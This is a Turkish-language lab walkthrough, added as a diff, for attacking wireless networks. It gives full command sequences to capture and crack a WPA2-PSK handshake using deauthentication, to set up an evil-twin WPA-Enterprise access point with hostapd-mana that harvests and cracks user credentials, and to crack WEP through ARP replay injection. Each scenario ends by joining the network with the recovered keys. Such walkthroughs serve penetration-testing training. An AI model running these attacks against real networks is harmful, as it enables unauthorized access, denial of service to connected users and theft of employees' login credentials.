@@ -1,0 +1,214 @@
+Kablosuz Ağ Sızma Testi Uygulama Rehberi (Walkthrough)
+Bu doküman, üç farklı kablosuz ağ güvenliği senaryosunun (WPA2-PSK, WPA-Enterprise ve WEP) analiz edilmesi, istismar edilmesi ve ağa erişim sağlanması adımlarını içerir.
+
+Not: Aşağıdaki komutlarda kullanılan wlan0 arayüzü ve hedef bilgileri (MAC, SSID) laboratuvar ortamına göre değişkenlik gösterebilir.
+
+Senaryo 1: WPA2-PSK Ağına Sızma (El Sıkışma Yakalama)
+Bu senaryoda, WPA2 ile korunan kişisel bir ağın parolası, 4'lü el sıkışma (4-way handshake) yakalanarak ve sözlük saldırısı yapılarak elde edilecektir.
+
+1. Hazırlık ve Keşif
+Öncelikle kablosuz ağ kartı izleme (monitor) moduna alınır ve çevredeki ağlar taranır.
+
+Bash
+
+# Root yetkisi alınır
+sudo su
+
+# Mevcut arayüzler kontrol edilir
+ip -br -c a
+
+# Arayüz monitor moduna alınır (Genellikle wlan0mon ismini alır)
+sudo airmon-ng start wlan0
+
+# Hedef ağları tespit etmek için genel tarama yapılır
+airodump-ng wlan0mon --band abg
+2. Hedef Odaklı Dinleme ve Handshake Yakalama
+Hedef ağ (SSID: Egitim_WPA) tespit edildikten sonra, sadece o kanal ve BSSID (MAC) üzerine odaklanılır.
+
+Bash
+
+# Hedef ağın Kanalı: 6, BSSID: AA:BB:CC:11:22:33
+airodump-ng wlan0mon --band abg -c 6 --wps --bssid AA:BB:CC:11:22:33 -w yakalanan_handshake
+Eğer ağda bağlı bir kullanıcı varsa, el sıkışma paketini (WPA Handshake) daha hızlı yakalamak için bağlantı koparma (Deauthentication) saldırısı uygulanır.
+
+Bash
+
+# -0 10: 10 adet deauth paketi gönderir
+# -a: Hedef Access Point MAC adresi
+# -c: Hedef İstemci (Client) MAC adresi
+aireplay-ng -0 10 -a AA:BB:CC:11:22:33 -c 11:22:33:44:55:66 wlan0mon
+Ekranın sağ üst köşesinde "WPA Handshake: AA:BB:CC:11:22:33" yazısı görüldüğünde işlem tamamdır.
+
+3. Parola Kırma (Cracking)
+Yakalanan .cap dosyası üzerinde, bir wordlist kullanılarak sözlük saldırısı gerçekleştirilir.
+
+Bash
+
+aircrack-ng -w /usr/share/john/password.lst yakalanan_handshake-01.cap
+Sonuç: KEY FOUND! [ P@ssw0rd123 ]
+
+4. Ağa Bağlanma
+Elde edilen parola ile ağa bağlanmak için wpa_supplicant yapılandırması hazırlanır.
+
+Dosya: wpa_lab.conf
+
+Kod snippet'i
+
+network={
+    ssid="Egitim_WPA"
+    scan_ssid=1
+    psk="P@ssw0rd123"
+    key_mgmt=WPA-PSK
+}
+Bağlantı sağlanır ve IP adresi alınır:
+
+Bash
+
+# Monitor modu kapatılır
+airmon-ng stop wlan0mon
+
+# Ağa bağlanılır
+wpa_supplicant -Dnl80211 -iwlan0 -c wpa_lab.conf -B
+
+# IP adresi alınır
+dhclient wlan0 -v
+
+# CURLLE
+----------------
+Senaryo 2: WPA-Enterprise (Rogue AP Saldırısı)
+Bu senaryoda, kurumsal bir ağa (SSID: Sirket_Corp) sahte bir erişim noktası (Evil Twin) kurularak kullanıcıların kimlik bilgileri (Hash) çalınacaktır.
+
+1. Sertifika Hazırlığı
+Sahte AP'nin inandırıcı olması ve EAP bağlantısını kabul etmesi için sertifikalar oluşturulur.
+
+Bash
+
+# CA (Certificate Authority) oluşturma
+openssl genrsa -aes256 -out ca.key.pem 4096
+openssl req -x509 -new -nodes -key ca.key.pem -sha256 -days 3650 -out ca.cert.pem
+
+# Server sertifikası oluşturma
+openssl genrsa -aes256 -out server.key.pem 2048
+openssl req -new -key server.key.pem -out server.csr.pem
+openssl x509 -req -in server.csr.pem -CA ca.cert.pem -CAkey ca.key.pem -CAcreateserial -out server.cert.pem -days 365 -sha256
+
+# Diffie-Hellman parametreleri
+openssl dhparam -out dh -2 2048
+2. Hostapd-Mana Yapılandırması
+Saldırı aracı olan hostapd-mana için yapılandırma dosyası (mana.conf) aşağıdaki gibi düzenlenir. Hedef ağın kanalı ve ismi birebir taklit edilmelidir.
+
+Dosya: mana.conf
+
+Kod snippet'i
+
+ssid=Sirket_Corp
+interface=wlan0
+driver=nl80211
+channel=11   # Hedef ağın kanalı
+hw_mode=g
+ieee8021x=1
+eap_server=1
+eapol_key_index_workaround=0
+eap_user_file=mana.eap_user
+ca_cert=ca.cert.pem
+server_cert=server.cert.pem
+private_key=server.key.pem
+private_key_passwd=1234
+dh_file=dh
+auth_algs=1
+wpa=3
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=CCMP TKIP
+mana_wpe=1                   # Saldırı modu aktif
+mana_credout=/tmp/hostapd.credout
+mana_eapsuccess=1
+3. Saldırıyı Başlatma ve Hash Yakalama
+Sahte AP başlatılır. Gerçek ağdaki kullanıcıları düşürmek için aireplay-ng ile deauth saldırısı yapılabilir.
+
+Bash
+
+hostapd-mana mana.conf
+Kullanıcı bağlandığında ekranda NETNTLM hash değerleri görülecektir.
+
+4. Hash Kırma (Asleap)
+Yakalanan Challenge ve Response değerleri asleap aracı ile kırılır.
+
+Bash
+
+asleap -C <Challenge_Degeri> -R <Response_Degeri> -W /usr/share/john/password.lst
+Sonuç:
+
+Kullanıcı Adı: Sirket\ogrenci
+
+Parola: Laboratuvar1!
+
+5. Ağa Bağlanma
+Elde edilen kurumsal kimlik bilgileriyle gerçek ağa bağlanılır.
+
+Dosya: wpa_ent.conf
+
+Kod snippet'i
+
+network={
+    ssid="Sirket_Corp"
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    identity="Sirket\ogrenci"
+    password="Laboratuvar1!"
+    phase2="auth=MSCHAPV2"
+}
+Bash
+
+wpa_supplicant -Dnl80211 -iwlan0 -c wpa_ent.conf -B
+dhclient wlan0 -v
+
+# CURLLE
+
+--------
+Senaryo 3: WEP Ağına Sızma (Packet Injection)
+Eski bir teknoloji olan WEP şifrelemesine sahip bir ağa (SSID: Eski_WEP) paket enjeksiyonu yapılarak sızılacaktır.
+
+1. Keşif ve Veri Toplama
+Hedef WEP ağı tespit edilir ve veriler toplanmaya başlanır.
+
+Bash
+
+# Kanal 3'te çalışan hedefi dinlemeye başla
+airodump-ng wlan0mon --band abg -c 3 --bssid DD:EE:FF:44:55:66 -w wep_verisi
+2. Trafik Üretme (ARP Replay Attack)
+WEP kırmak için çok sayıda IV (Initialization Vector) gereklidir. Trafik oluşturmak için ARP Replay saldırısı kullanılır.
+
+Bash
+
+# -3: ARP Replay modu
+# -b: Hedef AP MAC
+# -h: Kendi MAC adresiniz veya bağlı bir istemcinin MAC adresi
+aireplay-ng -3 -b DD:EE:FF:44:55:66 -h 00:11:22:33:44:55 wlan0mon
+airodump-ng ekranındaki #Data sayısının hızla artması (Örn: 20.000+) beklenir.
+
+3. WEP Anahtarını Kırma
+Yeterli veri toplandığında aircrack-ng çalıştırılır.
+
+Bash
+
+aircrack-ng wep_verisi-01.cap
+Sonuç: KEY FOUND! [ 1A:2B:3C:4D:5E ]
+
+4. Ağa Bağlanma
+Bulunan HEX anahtarı ile bağlantı sağlanır.
+
+Dosya: wpa_wep.conf
+
+Kod snippet'i
+
+network={
+    ssid="Eski_WEP"
+    key_mgmt=NONE
+    wep_key0=1A2B3C4D5E
+}
+Bash
+
+airmon-ng stop wlan0mon
+wpa_supplicant -Dnl80211 -iwlan0 -c wpa_wep.conf -B
+dhclient wlan0 -v
+# CURLLE
